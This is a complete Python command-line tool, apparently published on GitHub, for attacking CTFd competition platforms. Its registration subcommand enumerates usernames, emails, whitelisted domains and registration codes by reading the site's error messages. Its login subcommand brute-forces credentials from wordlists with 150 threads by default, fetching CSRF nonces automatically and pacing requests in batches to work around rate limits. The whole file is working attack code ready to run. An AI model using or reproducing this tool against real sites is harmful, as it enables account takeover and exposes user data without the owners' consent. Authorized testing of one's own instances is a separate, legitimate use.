#!/usr/bin/env -S uv run -q --script
# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "typer",
#   "rich",
#   "tqdm",
#   "beautifulsoup4",
#   "requests",
# ]
# ///

"""
ctfd-enum: Enumeration tool for CTFd.

Usage:
    ./ctfd-enum.py

License:
    MIT License (c) 2025 bjornmorten
"""

import copy
import logging
import re
import time
import warnings
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import contextmanager
from dataclasses import dataclass, field
from io import StringIO
from itertools import chain, zip_longest
from pathlib import Path
from queue import Empty, Queue
from threading import Barrier, Lock
from typing import Any, NamedTuple, TypeVar
from urllib.parse import urlparse

import requests
import typer
from bs4 import BeautifulSoup
from rich.console import Console
from rich.logging import RichHandler
from rich.markup import escape
from rich.panel import Panel
from rich.table import Table
from tqdm import TqdmExperimentalWarning
from tqdm.rich import tqdm
from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore", category=TqdmExperimentalWarning)
warnings.filterwarnings("ignore", category=InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[RichHandler(rich_tracebacks=True, show_time=False, show_path=False)],
)
logger = logging.getLogger("ctfd-enum")

logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("urllib3.connectionpool").setLevel(logging.ERROR)

console = Console()
app = typer.Typer(add_completion=False, no_args_is_help=True)
T = TypeVar("T")


# -------------------------
# Configuration
# -------------------------


@dataclass(frozen=True, slots=True)
class Config:
    """Configuration constants"""

    user_agent: str = "ctfd-enum/1.0 (+https://github.com/bjornmorten/ctfd-enum)"
    default_threads: int = 150
    ratelimit_period: float = 5.0
    request_timeout: float = 5.0
    max_retries: int = 3
    connection_pool_size: int = 100

    # HTTP status codes
    HTTP_OK: int = 200
    HTTP_REDIRECT: int = 302
    HTTP_TOO_MANY_REQUESTS: int = 429

    # CTFd paths
    REGISTER_PATH: str = "/register"
    LOGIN_PATH: str = "/login"

    # Error messages
    ERROR_USERNAME_TAKEN: str = "That user name is already taken"
    ERROR_EMAIL_USED: str = "That email has already been used"
    ERROR_EMAIL_DOMAIN: str = "Your email address is not from an allowed domain"
    ERROR_REGISTRATION_CODE: str = "The registration code you entered was incorrect"
    ERROR_LOGIN_INCORRECT: str = "Your username or password is incorrect"

    @property
    def error_patterns(self) -> dict[str, tuple[str, bool]]:
        """Error patterns for registration enumeration.

        Returns a dict mapping field names to (error_message, should_exist) tuples.
        If should_exist is True, finding the error means the value is valid/registered.
        If False, not finding the error means the value is valid/whitelisted.
        """
        return {
            "username": (self.ERROR_USERNAME_TAKEN, True),
            "email": (self.ERROR_EMAIL_USED, True),
            "email_domain": (self.ERROR_EMAIL_DOMAIN, False),
            "registration_code": (self.ERROR_REGISTRATION_CODE, False),
        }


CONFIG = Config()


# -------------------------
# Exceptions
# -------------------------


class CTFdEnumError(Exception):
    """Base exception for CTFd enumeration errors."""

    pass


class RateLimitError(CTFdEnumError):
    """Raised when the server rate-limits the client (HTTP 429)."""

    pass


class NonceError(CTFdEnumError):
    """Raised when a nonce cannot be fetched."""

    pass


class InvalidResponseError(CTFdEnumError):
    """Raised when the server returns an unexpected response."""

    pass


# -------------------------
# Parsers / helpers
# -------------------------


def extract_url_root_from_html(html: str) -> str | None:
    """Extract the CTFd installation path from HTML.

    Args:
        html: The HTML content of a CTFd page.

    Returns:
        The detected URL root if found, or None otherwise.
    """
    if not html:
        return None

    soup = BeautifulSoup(html, "html.parser")
    scripts = soup.find_all("script")

    for script in scripts:
        text = script.string or ""
        match = re.search(r"""'urlRoot'\s*[:=]\s*["\'](.*?)["\']""", text)
        if match:
            val = match.group(1).strip()
            if val and not val.startswith("/"):
                val = "/" + val
            return val.rstrip("/")
    return None


def extract_nonce_from_html(html: str) -> str | None:
    """Extract the CSRF nonce from HTML registration/login page.

    Args:
        html: The HTML content of the page

    Returns:
        The nonce value if found, None otherwise
    """
    if not html:
        return None
    soup = BeautifulSoup(html, "html.parser")

    inp = soup.find("input", {"name": "nonce"})
    if inp and inp.has_attr("value"):
        return inp["value"]
    return None


def extract_errors_from_html(html: str) -> list[str]:
    """Extract error messages from HTML alerts.

    Args:
        html: The HTML content of the page

    Returns:
        List of error message strings
    """
    if not html:
        return []

    soup = BeautifulSoup(html, "html.parser")
    alert_nodes = soup.select(".alert")

    msgs = [node.get_text(strip=True).strip("×") for node in alert_nodes]

    return msgs


# -------------------------
# I/O helpers
# -------------------------


def load_wordlist(path: Path | None) -> list[str]:
    """Load a wordlist from a file, removing duplicates and empty lines.

    Args:
        path: Path to the wordlist file, or None

    Returns:
        List of unique, non-empty lines from the file
    """
    if path is None:
        return []

    text = path.read_text(encoding="utf-8", errors="ignore")
    lines = []
    seen = set()

    for raw in text.splitlines():
        line = raw.strip()
        if not line or line in seen:
            continue
        seen.add(line)
        lines.append(line)

    return lines


# -------------------------
# Results management
# -------------------------


@dataclass
class ResultsCollector:
    """Thread-safe collector for enumeration results."""

    _results: list[tuple[str, str]] = field(default_factory=list)
    _lock: Lock = field(default_factory=Lock)
    _found_usernames: set[str] = field(default_factory=set)
    _start_time: float = field(default_factory=time.time)

    def add(self, kind: str, value: str) -> None:
        """Add a finding to the results.

        Args:
            kind: Type of finding (e.g., "username", "registration code")
            value: The found value
        """
        with self._lock:
            msg = f"[green]✅ {escape(kind.capitalize())}[/]: [bold]{escape(value)}[/]"

            buffer = StringIO()
            temp_console = Console(
                file=buffer, force_terminal=True, color_system="auto"
            )
            temp_console.print(msg, end="")
            colored_msg = buffer.getvalue()
            tqdm.write(colored_msg)

            self._results.append((kind, value))

            # Track found usernames for login bruteforce optimization
            if kind == "credentials":
                username = value.split(":")[0] if ":" in value else None
                if username:
                    self._found_usernames.add(username)

    def is_username_found(self, username: str) -> bool:
        """Check if credentials for a username have already been found.

        Args:
            username: The username to check

        Returns:
            True if credentials found, False otherwise
        """
        with self._lock:
            return username in self._found_usernames

    def get_results(self) -> list[tuple[str, str]]:
        """Get all collected results.

        Returns:
            List of (kind, value) tuples
        """
        with self._lock:
            return self._results.copy()

    def print_summary(self, sort_by: str = "type", reverse: bool = False) -> None:
        """Print a formatted summary table of findings.

        Args:
            sort_by: Sort key - "type" or "value"
            reverse: Whether to reverse sort order
        """
        results = self.get_results()

        console.print()

        if not results:
            console.print("[bold yellow]No findings[/]")
            return

        key_idx = 0 if sort_by == "type" else 1
        sorted_results = sorted(results, key=lambda x: x[key_idx], reverse=reverse)

        # Create findings table
        table = Table(
            show_header=True, header_style="bold cyan", border_style="bright_blue"
        )
        table.add_column("Type", style="cyan", justify="left", no_wrap=True)
        table.add_column("Value", style="bright_green", justify="left")

        for kind, val in sorted_results:
            table.add_row(kind, val)

        console.print(table)


# -------------------------
# Rate limiting state
# -------------------------


@dataclass
class RateLimitState:
    """Thread-safe state tracker for rate limiting."""

    _is_limited: bool = False
    _lock: Lock = field(default_factory=Lock)

    def set_limited(self) -> None:
        """Mark that rate limiting has been triggered."""
        with self._lock:
            self._is_limited = True

    def reset(self) -> None:
        """Reset the rate limit state."""
        with self._lock:
            self._is_limited = False

    def is_limited(self) -> bool:
        """Check if currently rate limited.

        Returns:
            True if rate limited, False otherwise
        """
        with self._lock:
            return self._is_limited


# -------------------------
# Session Management
# -------------------------


@dataclass
class CTFdSession:
    """Managed session for interacting with a CTFd instance."""

    base_url: str
    verify_ssl: bool = True
    _session: requests.Session = field(init=False)
    _nonce: str | None = field(init=False, default=None)

    def __post_init__(self) -> None:
        """Initialize the session after dataclass initialization."""
        self.base_url = self.base_url.rstrip("/")
        self._session = requests.Session()
        self._session.headers.update({"User-Agent": CONFIG.user_agent})

        self._session.verify = self.verify_ssl
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

        # Configure connection pooling for better performance
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=CONFIG.connection_pool_size,
            pool_maxsize=CONFIG.connection_pool_size,
            max_retries=0,
            pool_block=False,
        )
        self._session.mount("http://", adapter)
        self._session.mount("https://", adapter)

    def __enter__(self) -> "CTFdSession":
        """Enter context manager."""
        return self

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        """Exit context manager and close session."""
        self.close()

    def close(self) -> None:
        """Close the underlying session."""
        if hasattr(self, "_session"):
            try:
                self._session.close()
            except Exception as e:
                logger.debug(f"Error closing session: {e}")

    def fetch_nonce(self) -> str:
        """Fetch a CSRF nonce from the registration page.

        Returns:
            The nonce string

        Raises:
            typer.Exit: If the request fails (HTTP error, SSL error, or connection issue).
        """
        url = f"{self.base_url}{CONFIG.REGISTER_PATH}"
        try:
            r = self._session.get(url, timeout=CONFIG.request_timeout)

            # Refetch from correct base path if provided URL had extra path
            url_root = extract_url_root_from_html(r.text)
            parsed_base_url = urlparse(self.base_url)
            if url_root is not None and url_root != parsed_base_url.path:
                parsed = urlparse(self.base_url)
                self.base_url = f"{parsed.scheme}://{parsed.netloc}{url_root}"

                r = self._session.get(
                    f"{self.base_url}{CONFIG.REGISTER_PATH}",
                    timeout=CONFIG.request_timeout,
                )

            if "CTFd" not in r.text:
                console.print("[red]❌ Target does not appear to be a CTFd instance")
                raise typer.Exit(code=1)

            self._nonce = extract_nonce_from_html(r.text)

            if not self._nonce:
                console.print("[red]❌ Could not find nonce in registration page")
                raise typer.Exit(code=1)

            return self._nonce
        except requests.exceptions.SSLError as e:
            if "UNEXPECTED_EOF_WHILE_READING" in str(e):
                console.print(
                    "[yellow]Target does not appear to support HTTPS — retrying over HTTP...[/]\n"
                )
                parsed = urlparse(self.base_url)
                self.base_url = f"http://{parsed.netloc}"

                if getattr(self, "_tried_http_fallback", False):
                    console.print("[red]❌ HTTP fallback also failed.[/]")
                    raise typer.Exit(code=1)

                self._tried_http_fallback = True
                return self.fetch_nonce()
            elif "SSLCertVerificationError" in str(e):
                console.print(
                    "[red]❌ SSL certificate verification failed.[/]\n"
                    "[yellow]Hint:[/] Use [cyan]--insecure[/cyan] to ignore invalid SSL certificates."
                )
            else:
                console.print(
                    "[red]❌ TLS handshake failed:[/] The server returned an internal error during SSL negotiation.\n"
                    "[yellow]Hint:[/] The target's HTTPS configuration may be broken. Try using [cyan]--insecure[/cyan] or plain HTTP."
                )
            raise typer.Exit(code=1)
        except requests.exceptions.ConnectionError:
            console.print(
                "[red]❌ Failed to connect:[/] The target refused the connection.\n"
                "[yellow]Hint:[/] Make sure the server is running and the target URL is correct."
            )
            raise typer.Exit(code=1)

    @property
    def nonce(self) -> str | None:
        """Get the current nonce, fetching if necessary."""
        if self._nonce is None:
            self._nonce = self.fetch_nonce()
        return self._nonce

    @contextmanager
    def preserve_cookies(self):
        """Context manager to preserve cookies during operations.

        Ensures we don't persist cookies when operations like login are successful
        but we want to test multiple credentials.

        Yields:
            None
        """
        old_cookies = copy.deepcopy(self._session.cookies)
        try:
            yield
        finally:
            self._session.cookies = old_cookies

    def post_register(
        self,
        username: str | None = None,
        email: str | None = None,
        regcode: str | None = None,
    ) -> requests.Response:
        """POST a registration attempt to the CTFd instance.

        Args:
            username: Username to register
            email: Email address to register
            regcode: Registration code to test

        Returns:
            The response object

        Raises:
            ValueError: If none of username, email, or regcode are provided
            NonceError: If nonce is not available
        """
        if not (username or email or regcode):
            raise ValueError("Either username, email or regcode must be set")

        if not self.nonce:
            raise NonceError("No nonce available")

        url = f"{self.base_url}{CONFIG.REGISTER_PATH}"
        payload = {
            "name": username or "",
            "email": email or "",
            "password": "",
            "registration_code": regcode or "",
            "nonce": self.nonce,
        }
        return self._session.post(
            url, data=payload, allow_redirects=False, timeout=CONFIG.request_timeout
        )

    def probe_registration_code_and_whitelisted_email(self) -> tuple[bool, bool]:
        """Check if registration codes and whitelisted domains are enabled.

        Returns:
            (registration_code_enabled, email_domain_whitelisted).
        """
        try:
            resp = self.post_register(
                email="@test.invalid",
                regcode="INVALID_PROBE_CODE_12345",
            )
            errors = extract_errors_from_html(resp.text)
            regcode_enabled = CONFIG.ERROR_REGISTRATION_CODE in errors
            domain_enabled = CONFIG.ERROR_EMAIL_DOMAIN in errors
            return regcode_enabled, domain_enabled
        except Exception as e:
            logger.debug(f"Error probing registration codes and emails: {e}")
            return False, False

    def post_login(self, username: str, password: str) -> requests.Response:
        """POST a login attempt to the CTFd instance.

        Args:
            username: Username or email to try
            password: Password to try

        Returns:
            The response object

        Raises:
            ValueError: If username or password is missing
            NonceError: If nonce is not available
        """
        if not all([username, password]):
            raise ValueError("Both username and password must be set")

        if not self.nonce:
            raise NonceError("No nonce available")

        url = f"{self.base_url}{CONFIG.LOGIN_PATH}"
        payload = {"name": username, "password": password, "nonce": self.nonce}

        with self.preserve_cookies():
            return self._session.post(
                url, data=payload, allow_redirects=False, timeout=CONFIG.request_timeout
            )


# -------------------------
# Validation helpers
# -------------------------


def validate_url(url: str) -> str:
    """Validate and normalize a CTFd target URL.

    Automatically adds 'https://' if missing, and trims trailing slashes.
    """
    url = url.strip()
    if not url:
        raise ValueError("URL cannot be empty")

    if not url.startswith(("http://", "https://")):
        if ":8000" in url or url.startswith("localhost") or url.startswith("127."):
            url = f"http://{url}"
        else:
            url = f"https://{url}"

    parsed = urlparse(url)
    if not parsed.netloc:
        raise ValueError("Invalid URL format")

    return url.rstrip("/")


def validate_email(email: str) -> bool:
    """Validate an email address format.

    Args:
        email: The email address to validate

    Returns:
        True if valid, False otherwise
    """
    return "@" in email and len(email.split("@")) == 2


def validate_domain(domain: str) -> bool:
    """Validate a domain format.

    Args:
        domain: The domain to validate

    Returns:
        True if valid, False otherwise
    """
    return "@" not in domain and len(domain) > 0


# -------------------------
# Enumeration helpers
# -------------------------


class RegistrationAttempt(NamedTuple):
    """A registration enumeration attempt."""

    username: str | None
    email: str | None
    email_domain: str | None
    registration_code: str | None


class LoginAttempt(NamedTuple):
    """A login bruteforce attempt."""

    username: str
    password: str


def build_registration_attempts(
    usernames: list[str],
    emails: list[str],
    domains: list[str],
    codes: list[str],
) -> list[RegistrationAttempt]:
    """Build a list of registration attempts from wordlists.

    Combines usernames, emails, domains, and registration codes into attempts

    Args:
        usernames: List of usernames to test
        emails: List of email addresses to test
        domains: List of email domains to test
        codes: List of registration codes to test

    Returns:
        List of RegistrationAttempt objects
    """
    email_fields = chain(emails, domains)
    combined = zip_longest(usernames, email_fields, codes, fillvalue=None)

    attempts: list[RegistrationAttempt] = []
    for u, email_field, c in combined:
        if email_field and email_field in emails:
            e, d = email_field, None
        else:
            e, d = None, email_field
        attempts.append(RegistrationAttempt(u, e, d, c))

    return attempts


def build_login_attempts(
    usernames: list[str],
    passwords: list[str],
) -> list[tuple[str, str]]:
    """Build a list of login attempts from usernames and passwords.

    Creates the cartesian product of usernames and passwords.

    Args:
        usernames: List of usernames to test
        passwords: List of passwords to test

    Returns:
        List of (username, password) tuples
    """
    attempts = [(u, p) for u in usernames for p in passwords]
    return attempts


def classify_register_response(r: requests.Response) -> dict[str, bool]:
    """Classify a registration response to determine what was found.

    Args:
        r: The response from a registration attempt

    Returns:
        Dictionary mapping field names to whether they were found

    Raises:
        RateLimitError: If the server returned HTTP 429
    """
    if r.status_code == 429:
        raise RateLimitError("Rate limit exceeded")
    errors = extract_errors_from_html(r.text)
    return {k: (v in errors) == b for k, (v, b) in CONFIG.error_patterns.items()}


def classify_login_response(r: requests.Response) -> bool:
    """Classify a login response to determine if credentials are valid.

    Args:
        r: The response from a login attempt

    Returns:
        True if login was successful, False otherwise

    Raises:
        RateLimitError: If the server returned HTTP 429
        InvalidResponseError: If the response is unexpected
    """
    match r.status_code:
        case 302:  # Redirect indicates successful login
            return True
        case 429:  # Rate limited
            raise RateLimitError("Rate limit exceeded")
        case _:
            if CONFIG.ERROR_LOGIN_INCORRECT in r.text:
                return False
            raise InvalidResponseError(f"Unexpected response: HTTP {r.status_code}")


def attempt_registration(
    session: CTFdSession, attempt: RegistrationAttempt
) -> dict[str, bool]:
    """Attempt a registration and classify the response.

    Args:
        session: CTFd session to use
        attempt: The registration attempt details

    Returns:
        Dictionary mapping field names to whether they were found
    """
    email = attempt.email or (
        f"@{attempt.email_domain}" if attempt.email_domain else None
    )
    resp = session.post_register(
        username=attempt.username, email=email, regcode=attempt.registration_code
    )
    valid = classify_register_response(resp)
    return valid


def attempt_login(session: CTFdSession, username: str, password: str) -> bool:
    """Attempt a login and classify the response.

    Args:
        session: CTFd session to use
        username: Username to try
        password: Password to try

    Returns:
        True if login was successful, False otherwise
    """
    resp = session.post_login(username, password)
    valid = classify_login_response(resp)
    return valid


def print_register_result(
    attempt: RegistrationAttempt, result: dict[str, bool], collector: ResultsCollector
) -> None:
    """Print and record registration enumeration results.

    Args:
        attempt: The registration attempt that was made
        result: Classification results from the attempt
        collector: Results collector to store findings
    """
    if attempt.username and result.get("username"):
        collector.add("username", attempt.username)
    if attempt.email and result.get("email"):
        collector.add("email", attempt.email)
    if attempt.email_domain and result.get("email_domain"):
        collector.add("whitelisted domain", attempt.email_domain)
    if attempt.registration_code and result.get("registration_code"):
        collector.add("registration code", attempt.registration_code)


def print_login_result(
    pair: tuple[str, str], result: bool, collector: ResultsCollector
) -> None:
    """Print and record login bruteforce results.

    Args:
        pair: Tuple of (username, password) that was attempted
        result: Whether the login was successful
        collector: Results collector to store findings
    """
    if result:
        collector.add("credentials", f"{pair[0]}:{pair[1]}")


# -------------------------
# Enumeration orchestration
# -------------------------


def run_enumeration(
    items: list[T],
    worker: Callable[[T], Any],
    printer: Callable[[T, Any, ResultsCollector], None],
    threads: int,
    collector: ResultsCollector,
    skip_checker: Callable[[T, ResultsCollector], bool] | None = None,
) -> None:
    """Run enumeration with rate limiting and progress tracking.

    Optimized for speed with persistent thread pool and batched synchronization.

    Args:
        items: List of items to enumerate
        worker: Function to process each item
        printer: Function to print/record results
        threads: Number of worker threads
        collector: Results collector for findings
        skip_checker: Optional function to check if an item should be skipped
    """
    rate_limit_state = RateLimitState()
    queue: Queue[tuple[T, int]] = Queue()  # (item, retry_count)
    batch_size = threads

    # Initialize queue with items and retry count of 0
    for item in items:
        queue.put((item, 0))

    total = len(items)
    skipped = 0
    last_batch_end_time = 0.0

    with (
        ThreadPoolExecutor(max_workers=threads) as executor,
        tqdm(total=total, desc="Enumerating") as pbar,
    ):
        while not queue.empty():
            # Build batch
            batch = []
            for _ in range(batch_size):
                try:
                    item, retry_count = queue.get_nowait()

                    if skip_checker and skip_checker(item, collector):
                        skipped += 1
                        pbar.update(1)
                        continue

                    batch.append((item, retry_count))
                except Empty:
                    break

            if not batch:
                break

            # Rate limiting - wait from when last batch ended
            if last_batch_end_time > 0:
                elapsed = time.time() - last_batch_end_time
                if elapsed < CONFIG.ratelimit_period:
                    time.sleep(CONFIG.ratelimit_period - elapsed)

            rate_limit_state.reset()

            # Create barrier for this batch
            barrier = Barrier(len(batch))

            # Worker function with barrier (no blocking retries)
            def batch_worker(
                item_data: tuple[T, int],
            ) -> tuple[T, Any | Exception, int]:
                item, retry_count = item_data
                try:
                    barrier.wait()  # Synchronize all threads
                except Exception:
                    pass

                try:
                    if rate_limit_state.is_limited():
                        raise Exception("Rate limited")
                    result = worker(item)
                    return item, result, retry_count
                except RateLimitError as e:
                    rate_limit_state.set_limited()
                    return item, e, retry_count
                except Exception as e:
                    # Return error immediately, will be re-queued if needed
                    return item, e, retry_count

            # Submit all batch items at once
            futures = [executor.submit(batch_worker, item_data) for item_data in batch]

            # Collect results
            suc = 0
            err = 0
            for fut in as_completed(futures):
                item, result, retry_count = fut.result()

                if isinstance(result, Exception):
                    # Re-queue if under retry limit
                    if retry_count < CONFIG.max_retries:
                        queue.put((item, retry_count + 1))
                    else:
                        # Max retries exceeded, give up
                        logger.debug(f"Failed after {retry_count} retries: {result}")
                        pbar.update(1)  # Count as processed to avoid hanging
                    err += 1
                else:
                    printer(item, result, collector)
                    suc += 1

            pbar.update(suc)

            last_batch_end_time = time.time()

        tqdm.write("")

    if skipped > 0:
        console.print(f"[dim]Skipped {skipped} attempts (credentials already found)[/]")

    collector.print_summary()


# -------------------------
# Enumeration entrypoints
# -------------------------


def enumerate_register(
    base_url: str,
    usernames: list[str],
    emails: list[str],
    domains: list[str],
    codes: list[str],
    threads: int,
    insecure: bool,
) -> ResultsCollector:
    """Enumerate registered usernames, emails, domains, and registration codes.

    Args:
        base_url: Base URL of the CTFd instance
        usernames: List of usernames to test
        emails: List of email addresses to test
        domains: List of email domains to test
        codes: List of registration codes to test
        threads: Number of worker threads

    Returns:
        ResultsCollector with all findings
    """
    collector = ResultsCollector()

    # Create a single shared session for all threads
    session = CTFdSession(base_url, verify_ssl=not insecure)

    if not session.nonce:
        console.print("[red]Failed to fetch nonce from target[/]")
        session.close()
        return collector

    # Probe for enabled features
    if codes or domains:
        regcode_enabled, domain_enabled = (
            session.probe_registration_code_and_whitelisted_email()
        )

        if codes and not regcode_enabled:
            console.print(
                "[yellow]Registration codes not enabled - skipping code enumeration[/]"
            )
            codes = []

        if domains and not domain_enabled:
            console.print(
                "[yellow]Email domain whitelist not enabled - skipping domain enumeration[/]"
            )
            domains = []

    attempts = build_registration_attempts(usernames, emails, domains, codes)

    if not attempts:
        console.print("[yellow]No items to enumerate after feature probing[/]")
        session.close()
        return collector

    def worker(attempt: RegistrationAttempt) -> dict[str, bool] | None:
        return attempt_registration(session, attempt)

    def printer(
        attempt: RegistrationAttempt, result: dict[str, bool], coll: ResultsCollector
    ):
        print_register_result(attempt, result, coll)

    run_enumeration(attempts, worker, printer, threads=threads, collector=collector)

    session.close()
    return collector


def enumerate_login(
    base_url: str,
    usernames: list[str],
    passwords: list[str],
    threads: int,
    insecure: bool,
) -> ResultsCollector:
    """Bruteforce login credentials.

    Optimized to skip remaining passwords for a username once valid credentials are found.

    Args:
        base_url: Base URL of the CTFd instance
        usernames: List of usernames to test
        passwords: List of passwords to test
        threads: Number of worker threads

    Returns:
        ResultsCollector with all findings
    """
    combos = build_login_attempts(usernames, passwords)
    collector = ResultsCollector()

    # Create a single shared session for all threads
    session = CTFdSession(base_url, verify_ssl=not insecure)
    if not session.nonce:
        console.print("[red]Failed to fetch nonce from target[/]")
        return collector

    def worker(pair: tuple[str, str]) -> bool:
        u, p = pair
        return attempt_login(session, u, p)

    def printer(pair: tuple[str, str], result: bool, coll: ResultsCollector):
        print_login_result(pair, result, coll)

    def skip_checker(pair: tuple[str, str], coll: ResultsCollector) -> bool:
        """Skip attempts for usernames that already have valid credentials."""
        username = pair[0]
        return coll.is_username_found(username)

    run_enumeration(
        combos,
        worker,
        printer,
        threads=threads,
        collector=collector,
        skip_checker=skip_checker,
    )

    session.close()
    return collector


# -------------------------
# UI Helpers
# -------------------------


def print_config_info(target: str, threads: int, wordlist_info: dict[str, int]) -> None:
    """Print configuration information.

    Args:
        target: Target URL
        threads: Number of threads
        wordlist_info: Dictionary of wordlist names and their counts
    """
    console.print(f"[bold cyan]Target:[/] [white]{target}[/]")
    console.print(f"[bold cyan]Threads:[/] [white]{threads}[/]")

    if wordlist_info:
        console.print("[bold cyan]Wordlists:[/]")
        for name, count in wordlist_info.items():
            if count > 0:
                console.print(f"  [dim]-[/] [bold]{name}[/]: [green]{count:,}[/]")


# -------------------------
# CLI
# -------------------------


@app.command("register", no_args_is_help=True)
def register(
    target: str = typer.Argument(
        ..., help="Base URL of the CTFd instance (e.g. https://demo.ctfd.io)"
    ),
    threads: int = typer.Option(
        CONFIG.default_threads,
        "-t",
        "--threads",
        help="Number of threads",
    ),
    usernames: Path | None = typer.Option(
        None,
        "-u",
        "--usernames",
        help="Wordlist of usernames to enumerate",
        exists=True,
        file_okay=True,
        dir_okay=False,
    ),
    emails: Path | None = typer.Option(
        None,
        "-e",
        "--emails",
        help="Wordlist of emails to enumerate",
        exists=True,
        file_okay=True,
        dir_okay=False,
    ),
    domains: Path | None = typer.Option(
        None,
        "-d",
        "--domains",
        help="Wordlist of whitelisted email domains to enumerate",
        exists=True,
        file_okay=True,
        dir_okay=False,
    ),
    codes: Path | None = typer.Option(
        None,
        "-c",
        "--codes",
        help="Wordlist of registration codes to enumerate",
        exists=True,
        file_okay=True,
        dir_okay=False,
    ),
    insecure: bool = typer.Option(
        False,
        "-k",
        "--insecure",
        help="Ignore invalid SSL certificates",
    ),
):
    """
    Enumerate CTFd registration (usernames, emails, registration codes).
    """
    # Validate input
    try:
        target = validate_url(target)
    except Exception as e:
        console.print(f"[red]❌ {str(e)}[/]")
        raise typer.Exit(code=1)

    # Load and validate wordlists
    usernames_list = load_wordlist(usernames) if usernames else []
    emails_list = load_wordlist(emails) if emails else []
    domains_list = load_wordlist(domains) if domains else []
    codes_list = load_wordlist(codes) if codes else []

    # Check if emails and email domains are valid
    valid_emails = [e for e in emails_list if validate_email(e)]
    invalid_emails = [e for e in emails_list if not validate_email(e)]

    valid_domains = [d for d in domains_list if validate_domain(d)]
    invalid_domains = [d for d in domains_list if not validate_domain(d)]

    if invalid_emails:
        console.print(
            f"[yellow]Warning: {len(invalid_emails)} invalid email(s) removed[/]"
        )

    if invalid_domains:
        console.print(
            f"[yellow]Warning: {len(invalid_domains)} invalid domain(s) removed[/]"
        )

    if not (usernames_list or valid_emails or valid_domains or codes_list):
        error_panel = Panel(
            "[red]No wordlists provided. Please specify at least one of:[/]\n"
            "  * --usernames (-u)\n"
            "  * --emails (-e)\n"
            "  * --domains (-d)\n"
            "  * --codes (-c)",
            title="[bold red]Error[/]",
            border_style="red",
            padding=(1, 2),
        )
        console.print(error_panel)
        raise typer.Exit(code=2)

    # Print configuration
    wordlist_info = {
        "Usernames": len(usernames_list),
        "Emails": len(valid_emails),
        "Domains": len(valid_domains),
        "Registration codes": len(codes_list),
    }
    print_config_info(target, threads, wordlist_info)

    console.print()

    enumerate_register(
        target,
        usernames_list,
        valid_emails,
        valid_domains,
        codes_list,
        threads,
        insecure,
    )


@app.command("login", no_args_is_help=True)
def login(
    target: str = typer.Argument(
        ..., help="Base URL of the CTFd instance (e.g. https://demo.ctfd.io)"
    ),
    threads: int = typer.Option(
        CONFIG.default_threads,
        "-t",
        "--threads",
        help="Number of threads",
    ),
    username: str | None = typer.Option(
        None, "-u", "--username", help="Username or email to use in bruteforce"
    ),
    usernames: Path | None = typer.Option(
        None,
        "-U",
        "--usernames",
        help="Wordlist of usernames or emails to use in bruteforce",
        exists=True,
        file_okay=True,
        dir_okay=False,
    ),
    password: str | None = typer.Option(
        None, "-p", "--password", help="Password to use in bruteforce"
    ),
    passwords: Path | None = typer.Option(
        None,
        "-P",
        "--passwords",
        help="Wordlist of passwords to use in bruteforce",
        exists=True,
        file_okay=True,
        dir_okay=False,
    ),
    insecure: bool = typer.Option(
        False,
        "-k",
        "--insecure",
        help="Ignore invalid SSL certificates",
    ),
):
    """
    Bruteforces CTFd login with provided usernames and passwords.
    """
    # Validate input
    try:
        target = validate_url(target)
    except Exception as e:
        console.print(f"[red]❌ {str(e)}[/]")
        raise typer.Exit(code=1)

    if bool(username) == bool(usernames):
        error_panel = Panel(
            "[red]Provide exactly ONE of:[/]\n"
            "  * --username (-u) for a single username\n"
            "  * --usernames (-U) for a wordlist file",
            title="[bold red]Error[/]",
            border_style="red",
            padding=(1, 2),
        )
        console.print(error_panel)
        raise typer.Exit(code=2)

    if bool(password) == bool(passwords):
        error_panel = Panel(
            "[red]Provide exactly ONE of:[/]\n"
            "  * --password (-p) for a single password\n"
            "  * --passwords (-P) for a wordlist file",
            title="[bold red]Error[/]",
            border_style="red",
            padding=(1, 2),
        )
        console.print(error_panel)
        raise typer.Exit(code=2)

    usernames_list = [username] if username else load_wordlist(usernames)
    passwords_list = [password] if password else load_wordlist(passwords)

    # Print configuration
    wordlist_info = {"Usernames": len(usernames_list), "Passwords": len(passwords_list)}
    print_config_info(target, threads, wordlist_info)

    console.print()

    enumerate_login(target, usernames_list, passwords_list, threads, insecure)


if __name__ == "__main__":
    app()
